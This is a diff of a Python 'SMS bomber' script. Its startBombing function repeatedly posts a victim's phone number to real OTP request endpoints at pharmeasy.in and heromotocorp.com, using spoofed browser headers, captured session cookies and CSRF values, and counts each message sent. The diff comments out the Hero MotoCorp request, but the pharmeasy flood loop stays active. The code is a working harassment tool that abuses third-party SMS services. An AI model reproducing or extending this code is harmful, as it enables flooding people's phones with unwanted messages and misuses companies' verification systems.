@@ -104,40 +104,40 @@ def startBombing(pn,cc,n,un):
         response = requests.post('https://pharmeasy.in/api/auth/requestOTP', headers=headers, json=data)
         i-=1
         print("[+]",n-i," Messages sent")
-        if i<=0:
-            break
-        time.sleep(2)
-        cookies = {
-           '_ga': 'GA1.2.1273460610.1561191565',
-           '_gid': 'GA1.2.172574299.1561191565',
-           '_gcl_au': '1.1.833556660.1561191566',
-           '_fbp': 'fb.1.1561191568709.1707722126',
-           'PHPSESSID': 'm5tap7nr75b2ehcn8ur261oq86',
-           }
-        headers={
-               'Host': 'www.heromotocorp.com',
-               'Connection': 'keep-alive',
-               'Content-Length': '126',
-               'Accept': '*/*',
-               'Origin': 'https://www.heromotocorp.com',
-               'X-Requested-With': 'XMLHttpRequest',
-               'Save-Data': 'on',
-               'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
-               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-               'Referer': 'https://www.heromotocorp.com/en-in/xpulse200/',
-               'Accept-Encoding': 'gzip, deflate, br',
-               'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
-               }
-        data = {
-             'mobile_no': pn,
-             'randome': 'ZZUC9WCCP3ltsd/JoqFe5HHe6WfNZfdQxqi9OZWvKis=',
-             'mobile_no_otp': '',
-             'csrf': '523bc3fa1857c4df95e4d24bbd36c61b'
-           }
-
-        response = requests.post('https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php', headers=headers, cookies=cookies, data=data)
-        i-=1
-        print("[+]",n-i," Messages sent")
+        # if i<=0:
+        #     break
+        # time.sleep(2)
+        # cookies = {
+        #    '_ga': 'GA1.2.1273460610.1561191565',
+        #    '_gid': 'GA1.2.172574299.1561191565',
+        #    '_gcl_au': '1.1.833556660.1561191566',
+        #    '_fbp': 'fb.1.1561191568709.1707722126',
+        #    'PHPSESSID': 'm5tap7nr75b2ehcn8ur261oq86',
+        #    }
+        # headers={
+        #        'Host': 'www.heromotocorp.com',
+        #        'Connection': 'keep-alive',
+        #        'Content-Length': '126',
+        #        'Accept': '*/*',
+        #        'Origin': 'https://www.heromotocorp.com',
+        #        'X-Requested-With': 'XMLHttpRequest',
+        #        'Save-Data': 'on',
+        #        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
+        #        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        #        'Referer': 'https://www.heromotocorp.com/en-in/xpulse200/',
+        #        'Accept-Encoding': 'gzip, deflate, br',
+        #        'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
+        #        }
+        # data = {
+        #      'mobile_no': pn,
+        #      'randome': 'ZZUC9WCCP3ltsd/JoqFe5HHe6WfNZfdQxqi9OZWvKis=',
+        #      'mobile_no_otp': '',
+        #      'csrf': '523bc3fa1857c4df95e4d24bbd36c61b'
+        #    }
+        #
+        # response = requests.post('https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php', headers=headers, cookies=cookies, data=data)
+        # i-=1
+        # print("[+]",n-i," Messages sent")
         if i<=0:
             break
         time.sleep(2)
